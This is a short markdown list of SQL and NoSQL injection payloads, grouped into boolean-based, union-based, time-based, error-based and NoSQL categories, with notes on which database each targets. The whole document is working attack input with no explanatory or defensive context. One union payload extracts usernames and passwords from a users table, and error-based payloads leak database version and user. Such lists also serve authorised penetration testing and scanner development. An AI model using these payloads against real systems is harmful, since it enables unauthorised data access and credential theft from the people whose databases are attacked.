# SQLi payload bank

## Boolean-based
' AND '1'='1
' AND '1'='2
' OR 1=1--
' OR 1=1#
1' ORDER BY 1--  (column count)

## Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--

## Time-based
' AND SLEEP(5)--
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--
' AND pg_sleep(5)--  (Postgres)
WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND sleep(5)#  (MySQL)

## Error-based
' AND extractvalue(1,concat(0x7e,(SELECT version())))--  (MySQL)
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--  (MySQL)
' AND CAST((SELECT @@version) AS int)--  (MSSQL)

## NoSQL
{"$ne": null}, {"$gt": ""}
{"$regex": ".*"}, {"$where": "sleep(5000)"}
username[$ne]=x&password[$ne]=y  (URL form)
